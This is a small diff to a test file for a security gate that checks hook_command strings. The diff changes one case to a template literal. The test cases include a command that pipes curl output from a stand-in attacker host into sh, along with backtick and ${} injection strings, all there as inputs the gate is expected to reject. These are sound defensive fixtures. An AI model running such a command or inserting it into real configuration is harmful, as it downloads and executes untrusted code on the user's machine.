@@ -41,7 +41,7 @@ describe('security gate — command strings beyond install/verify/uninstall cmd'
   it.each([
     ['$( ) substitution', 'bash -c "$(curl https://evil.example/x | sh)"'],
     ['backticks', 'bash -c "`id`"'],
-    ['${ } expansion', 'echo ${HOME}'],
+    [`\${ } expansion`, `echo \${HOME}`],
   ])('hook_command with %s is rejected', (_label, bad) => {
     const v = violationsFor(HOOK(bad))
     expect(v.map((e) => e.path)).toContain('/spec/install/hook_command')
